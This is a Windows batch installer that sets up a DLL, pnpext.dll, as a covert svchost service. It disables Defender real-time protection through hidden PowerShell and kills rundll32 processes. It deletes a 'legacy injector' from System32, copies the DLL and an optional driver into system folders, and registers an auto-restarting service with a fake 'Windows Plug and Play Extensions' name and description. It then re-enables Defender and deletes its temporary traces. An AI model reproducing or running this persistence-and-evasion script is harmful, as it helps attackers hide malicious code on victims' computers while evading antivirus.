@echo off
cd /d "%~dp0"
set Q=%TEMP%\_q.tmp
set SVC=WPnpSvc
set SVCGROUP=PnpExtGroup

if not exist "pnpext.dll" (echo [!] pnpext.dll not found & pause & exit /b 1)

echo ============================================
echo  Windows PnP Extensions - Setup
echo  (svchost.exe ServiceDll)
echo ============================================
echo.
echo [1/6] Disabling Defender...
start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
waitfor /t 2 x >"%Q%" 2>&1
echo [2/6] Removing old...
sc.exe stop %SVC% >"%Q%" 2>&1
waitfor /t 2 x >"%Q%" 2>&1
sc.exe delete %SVC% >"%Q%" 2>&1
taskkill.exe /F /IM rundll32.exe >"%Q%" 2>&1
REM Remove legacy injector if present
del /f /q "%SystemRoot%\System32\WPnpSvc.exe" >"%Q%" 2>&1
del /f /q "%SystemRoot%\System32\spoolcfg.exe" >"%Q%" 2>&1
echo [3/6] Copying files...
copy /y "pnpext.dll" "%SystemRoot%\System32\pnpext.dll" >"%Q%" 2>&1
if exist "pnpext.sys" (copy /y "pnpext.sys" "%SystemRoot%\System32\drivers\pnpext.sys" >"%Q%" 2>&1)
echo        Files copied
echo [4/6] Creating service (svchost.exe ServiceDll)...
REM Register svchost group
reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v %SVCGROUP% /t REG_MULTI_SZ /d %SVC% /f >"%Q%" 2>&1
REM Create service pointing to svchost.exe
sc.exe create %SVC% binPath= "%SystemRoot%\System32\svchost.exe -k %SVCGROUP%" type= share start= auto DisplayName= "Windows Plug and Play Extensions" >"%Q%" 2>&1
sc.exe description %SVC% "Manages extended Plug and Play device configuration and compatibility" >"%Q%" 2>&1
sc.exe failure %SVC% reset= 86400 actions= restart/10000/restart/30000/restart/60000 >"%Q%" 2>&1
echo [5/6] Configuring ServiceDll...
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%SystemRoot%\System32\pnpext.dll" /f >"%Q%" 2>&1
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%\Parameters" /v ServiceMain /t REG_SZ /d "ServiceMain" /f >"%Q%" 2>&1
echo [6/6] Starting service...
sc.exe start %SVC% >"%Q%" 2>&1
waitfor /t 5 x >"%Q%" 2>&1
start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
echo.
echo [+] Done! Service: %SVC% (svchost.exe -k %SVCGROUP%)
echo.
del "%Q%" >"%TEMP%\_q2.tmp" 2>&1
del "%TEMP%\_q2.tmp" >con 2>&1
pause
